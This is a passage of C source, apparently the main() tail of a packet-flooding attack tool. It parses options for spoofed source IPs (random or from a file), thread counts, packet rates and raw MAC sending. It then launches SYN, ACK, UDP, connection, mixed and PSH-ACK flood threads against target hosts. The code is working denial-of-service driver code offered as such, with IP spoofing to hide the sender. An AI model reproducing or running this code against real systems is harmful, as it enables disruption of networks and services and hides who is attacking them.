                    num_threads = atoi(argv[++arg]);
                    if(num_threads < 1) {
                        fprintf(stderr, "use at least 1 thread\n");
                        return -1;
                    }
                    break;
                case 's':
                    if(strcmp(argv[++arg], "random") == 0) {
                        src_addr = 0;
                    } else {
                        src_addr = leef_resolve_hostname(argv[arg]);
                        if(src_addr == -1) {
                            fprintf(stderr, "could not resolve source address\n");
                            return -1;
                        }
                    }
                    break;
                case 'u':
                    sleep_interval = atoi(argv[++arg]);
                    break;
                case 'j':
                    pps_output = atoi(argv[++arg]);
                    break;
                case 'q':
                    quiet = 1;
                    break;
                case 'f': {
                    FILE *fp = fopen(argv[++arg], "r");
                    if(fp) {
                        char ip[32];
                        int num_ips;
                        char ch;

                        printf("reading spoofed ip addresses...\n");
                        fflush(stdout);

                        spoof_addresses_size = 0;

                        fseek(fp, 0, SEEK_SET);
                        while((ch = fgetc(fp)) != EOF)
                            if(ch == '\n')
                                spoof_addresses_size++;

                        spoof_addresses = (uint32_t *)malloc(spoof_addresses_size * 4);

                        fseek(fp, 0, SEEK_SET);

                        num_ips = 0;
                        while(!feof(fp)) {
                            if(!fgets(ip, 32, fp))
                                break;
                            char *c = trim(ip);
                            if(strlen(c) < 7)
                                continue;
                            uint32_t addr = leef_string_to_addr(ip);
                            if(addr != 0 && addr != (uint32_t)-1)
                                spoof_addresses[num_ips++] = addr;
                        }
                        fclose(fp);

                        spoof_addresses_size = num_ips-1;

                        printf("done, read %d ips\n", spoof_addresses_size);
                    } else {
                        fprintf(stderr, "failed opening spoofing IPs text file!\n");
                        return -1;
                    }
                    break;
                }
                case 't':
                    run_time = (uint32_t)(atoi(argv[++arg]));
                    break;
                case 'd': {
                    FILE *fp = fopen(argv[++arg], "rb");
                    if(fp) {
                        fseek(fp, 0, SEEK_END);
                        send_data_size = ftell(fp);
                        fseek(fp, 0, SEEK_SET);
                        send_data = (uint8_t *) malloc(send_data_size);
                        fread(send_data, send_data_size, 1, fp);
                        fclose(fp);
                    } else {
                        fprintf(stderr, "could not find data binary file %s\n", argv[arg]);
                        return -1;
                    }
                    break;
                }
                case 'z': {
                    send_data = (uint8_t *) malloc(2048);
                    const char *page = argv[++arg];
                    const char *host = argv[++arg];
                    sprintf((char*)send_data, "GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", page, host);
                    send_data_size = strlen((char*)send_data);
                    break;
                }
                case 'o':
                    use_tcp_options = 1;
                    break;
                case 'b':
                    send_data_size = atoi(argv[++arg]);
                    send_data = (uint8_t *)malloc(send_data_size);
                    fill_data_with_random = 1;
                    break;
                case 'x':
                    drop_on_ack = 1;
                    break;
                case 'y':
                    drop_time = atoi(argv[++arg]);
                    break;
                case 'k':
                    read_macaddr(src_mac, argv[++arg]);
                    read_macaddr(dest_mac, argv[++arg]);
                    rawsendto = 1;
                    break;
                case 'c':
                    max_send_packets = atoi(argv[++arg]);
                    break;
                default:
                    fprintf(stderr, "incorrect option %s, see --help\n", opt);
                    return -1;
            }
        } else if(strncmp(opt, "--help", 6) == 0) {
            print_help(argv);
            return 0;
        } else {
            fprintf(stderr, "incorrect option %s, see --help\n", opt);
            return -1;
        }
    }

    long tid;
    for(tid=0;tid<num_targets;++tid) {
        if(targets[tid][1] == 0xFFFFFFFF)
            targets[tid][1] = dest_port;
    }

    if(pps_output > 0) {
        sleep_interval = MIN(((1000000 * num_threads * num_targets) / pps_output), 1000000);
    }

    if(send_data_size > 1460) {
        fprintf(stderr, "send data must be not greater than 1460\n");
        return -1;
    }

    if(num_targets == 0 && action != MONITOR) {
        fprintf(stderr, "please specify a target host, see --help\n");
        return -1;
    }

    if(interface == NULL) {
        fprintf(stderr, "please specify which interface that this action runs on\n");
        return -1;
    }

    int total_threads = (num_targets*num_threads) + 1;
    pthread_t *threads = (pthread_t *)malloc(sizeof(pthread_t) * total_threads);
    memset(threads, 0, sizeof(pthread_t) * total_threads);
    pthread_create(&threads[total_threads-1], NULL, run_timer_thread, NULL);

    /* force first tick */
    leef_get_ticks();

    /* run the action */
    int i;
    switch(action) {
        case TCP_PING:
            for(tid = 0; tid < num_targets; ++tid) {
                if(targets[tid][1] == 0) {
                    fprintf(stderr, "invalid target port for '%s'!\n", leef_addr_to_string(targets[tid][0]));
                    return -1;
                }
                if(!quiet) printf("TCP PING %s:%d\n", leef_addr_to_string(targets[tid][0]), targets[tid][1]);
                for(i=0; i < num_threads; ++i)
                    pthread_create(&threads[i], NULL, tcp_ping_thread, (void*)tid);
            }
            break;
        case CONN_FLOOD:
            for(tid = 0; tid < num_targets; ++tid) {
                if(targets[tid][1] == 0) {
                    fprintf(stderr, "invalid target port for '%s'!\n", leef_addr_to_string(targets[tid][0]));
                    return -1;
                }
                if(!quiet) printf("CONNECTION FLOOD %s:%d\n", leef_addr_to_string(targets[tid][0]), targets[tid][1]);
                for(i=0; i < num_threads; ++i)
                    pthread_create(&threads[i], NULL, conn_flood_attack_thread, (void*)tid);
            }
            break;
        case SYN_FLOOD:
            for(tid = 0; tid < num_targets; ++tid) {
                if(!quiet) printf("SYN FLOOD %s:%d\n", leef_addr_to_string(targets[tid][0]), targets[tid][1]);
                for(i=0; i < num_threads; ++i)
                    pthread_create(&threads[i], NULL, syn_flood_attack_thread, (void*)tid);
            }
            interface_tx_thread();
            break;
        case ACK_FLOOD:
            for(tid = 0; tid < num_targets; ++tid) {
                if(!quiet) printf("ACK FLOOD %s:%d\n", leef_addr_to_string(targets[tid][0]), targets[tid][1]);
                for(i=0; i < num_threads; ++i)
                    pthread_create(&threads[i], NULL, ack_flood_attack_thread, (void*)tid);
            }
            interface_tx_thread();
            break;
        case UDP_FLOOD:
            for(tid = 0; tid < num_targets; ++tid) {
                if(!quiet) printf("UDP FLOOD %s:%d\n", leef_addr_to_string(targets[tid][0]), targets[tid][1]);
                for(i=0; i < num_threads; ++i)
                    pthread_create(&threads[i], NULL, udp_flood_attack_thread, (void*)tid);
            }
            interface_tx_thread();
            break;
        case MIX_FLOOD:
            for(tid = 0; tid < num_targets; ++tid) {
                if(!quiet) printf("MIX FLOOD %s:%d\n", leef_addr_to_string(targets[tid][0]), targets[tid][1]);
                for(i=0; i < num_threads; ++i)
                    pthread_create(&threads[i], NULL, mix_flood_attack_thread, (void*)tid);
            }
            interface_tx_thread();
            break;
        case MIX2_FLOOD:
            for(tid = 0; tid < num_targets; ++tid) {
                if(!quiet) printf("MIX FLOOD %s:%d\n", leef_addr_to_string(targets[tid][0]), targets[tid][1]);
                for(i=0; i < num_threads; ++i)
                    pthread_create(&threads[i], NULL, mix2_flood_attack_thread, (void*)tid);
            }
            interface_tx_thread();
        case PA_FLOOD:
            for(tid = 0; tid < num_targets; ++tid) {
                if(!quiet) printf("PA FLOOD %s:%d\n", leef_addr_to_string(targets[tid][0]), targets[tid][1]);
                for(i=0; i < num_threads; ++i)
                    pthread_create(&threads[i], NULL, pa_flood_attack_thread, (void*)tid);
            }
            interface_tx_thread();
            break;
        case MONITOR:
            if(!quiet) printf("Monitoring traffic on interface %s\n", interface);
            interface_traffic_thread();
            break;
    }

    /* wait threads */
    for(i=0;i<total_threads;++i) {
        if(threads[i])
            pthread_join(threads[i], NULL);
    }

    /* cleanup */
    free(threads);

    if(spoof_addresses)
        free(spoof_addresses);

    if(send_data)
        free(send_data);
    return 0;
}

